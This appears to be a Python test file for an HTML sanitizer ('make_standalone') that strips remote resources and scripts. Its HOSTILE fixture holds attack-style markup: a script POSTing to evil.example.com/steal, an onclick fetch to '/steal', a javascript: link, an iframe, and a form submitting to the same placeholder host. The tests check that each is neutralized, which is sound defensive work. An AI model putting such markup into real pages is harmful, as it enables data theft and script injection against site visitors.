from __future__ import annotations

from src.generator.sanitize import make_standalone

HOSTILE = """<!DOCTYPE html>
<html><head>
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Evil">
<link rel="preload" href="//cdn.example.com/a.css" as="style">
<style>
@import url("https://cdn.example.com/evil.css");
@import "https://cdn.example.com/other.css";
@font-face { font-family: X; src: url(https://cdn.example.com/x.woff2); }
.hero { background: url(http://img.example.com/bg.jpg); }
.ok { background: url("data:image/png;base64,AAA"); }
</style>
<meta http-equiv="refresh" content="0;url=https://evil.example.com">
</head><body>
<script src="https://cdn.example.com/lib.js"></script>
<script>fetch("https://evil.example.com/steal", {method:"POST"}); document.getElementById("x").textContent = "hi";</script>
<script>document.getElementById("y").textContent = "benign interaction";</script>
<img src="https://img.example.com/photo.jpg" alt="team photo" width="600" height="400">
<img src="data:image/png;base64,AAA" alt="inline">
<source src="https://img.example.com/vid.mp4">
<video poster="https://img.example.com/poster.jpg"></video>
<iframe src="https://evil.example.com"></iframe>
<object data="https://evil.example.com/x.swf"></object>
<form action="https://evil.example.com/submit"><input type="text"></form>
<button onclick="fetch('/steal')">Click</button>
<button onclick="toggleMenu()">Menu</button>
<a href="javascript:alert(1)">bad</a>
<a href="https://example.com/page">good</a>
<p style="background: url(https://img.example.com/i.png); color: red;">Hello</p>
</body></html>"""


def test_hostile_fixture_fully_neutralized():
    out, report = make_standalone(HOSTILE)
    low = out.lower()
    assert "cdn.example.com" not in low
    assert "img.example.com" not in low
    assert "evil.example.com" not in low
    assert "fonts.googleapis.com" not in low
    assert "@import" not in low
    assert "<iframe" not in low
    assert "<object" not in low
    assert "http-equiv" not in low
    assert "javascript:" not in low
    assert "fetch(" not in out
    # Resource-loading attributes must all be data: URIs now; plain navigation
    # hrefs are intentionally kept (with target=_blank) per the spec.
    for attr in ("src=", "srcset=", "poster="):
        for token in _attr_values(out, attr):
            t = token.strip().lower()
            assert t.startswith(("data:", "#", "blob:")) or "://" not in t, (attr, token)
    assert report.removed_scripts == 1
    assert report.removed_links == 2
    assert report.replaced_images == 3  # remote img + source + video poster
    assert report.removed_embeds == 3  # iframe + object + meta refresh
    assert report.removed_js_blocks == 1
    assert report.neutralized_css_urls == 2  # stylesheet url() + inline style url()


def _attr_values(html: str, attr: str) -> list[str]:
    import re

    return re.findall(attr + r"""['"]?([^'"\s>]+)""", html, re.IGNORECASE)


def test_form_action_neutralized():
    out, _ = make_standalone(HOSTILE)
    assert 'action="#"' in out
    assert "onsubmit" in out.lower()


def test_benign_script_and_data_uri_survive():
    html = """<!DOCTYPE html><html><body>
<script>document.getElementById("m").classList.toggle("open");</script>
<img src="data:image/png;base64,AAA" alt="inline">
</body></html>"""
    out, report = make_standalone(html)
    assert "classList.toggle" in out
    assert "data:image/png;base64,AAA" in out
    assert report.removed_js_blocks == 0
    assert report.replaced_images == 0


def test_anchors_rewritten():
    out, _ = make_standalone('<!DOCTYPE html><html><body><a href="https://a.example/x">x</a></body></html>')
    assert 'target="_blank"' in out
    assert "noopener" in out


def test_placeholder_carries_dimensions_and_alt():
    out, _ = make_standalone(
        '<!DOCTYPE html><html><body><img src="https://x.example/a.jpg" alt="team photo" width="600" height="400"></body></html>'
    )
    assert "data:image/svg+xml" in out
    assert "team photo" in out
